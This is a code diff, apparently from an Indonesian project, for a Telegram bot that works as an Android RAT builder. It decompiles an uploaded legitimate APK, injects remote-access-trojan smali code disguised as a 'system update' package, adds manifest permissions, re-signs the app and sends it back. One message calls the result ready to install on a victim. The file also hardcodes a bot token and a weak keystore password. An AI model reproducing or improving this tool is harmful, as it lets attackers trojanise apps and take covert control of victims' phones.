@@ -7,11 +7,10 @@ import xml.etree.ElementTree as ET
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ── KONFIGURASI (TOKEN & ID KAMU) ──
 TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
 ALLOWED_CHAT_ID = 8598136412 
 
-WORK_DIR = "/root/rat_builder" # Sesuaikan folder di Cloud Phone
+WORK_DIR = "/data/data/com.termux/files/home/rat_builder"
 KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
 KEYSTORE_PASS = "123456"
 KEY_ALIAS = "debugkey"
@@ -50,7 +49,7 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔧 [1/5] Membongkar APK...")
         subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)
 
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/5] Menyuntikkan kode RAT (Smali)...")
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/5] Menyuntikkan kode RAT...")
         target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
         os.makedirs(target_smali_dir, exist_ok=True)
         if os.path.exists(PAYLOAD_SMALI_DIR):
@@ -58,7 +57,7 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
                 if smali_file.endswith(".smali"):
                     shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
         else:
-            raise Exception("Folder payload_smali tidak ditemukan! Compile dulu Payload.java.")
+            raise Exception("Folder payload_smali tidak ditemukan! Jalanin compile.sh dulu.")
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/5] Menyuntikkan Izin ke Manifest...")
         inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")
@@ -68,9 +67,10 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
         signed_apk = f"{apk_new_path}.signed.apk"
-        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}'", shell=True, check=True, capture_output=True)
+        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
+        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
 
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install ke korban:", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
         with open(signed_apk, "rb") as f:
             await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename=f"MOD_{file_name}")
             
@@ -107,7 +107,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n"
         "```\n"
         "✨ **RAT BUILDER SERVER** ✨\n"
-        "Status: 🟢 Online\n\n"
+        "Status: 🟢 Online (Termux Mode)\n\n"
         "Silakan kirim file `.apk` asli yang mau disusupi RAT."
     )
     await update.message.reply_text(banner, parse_mode='Markdown')
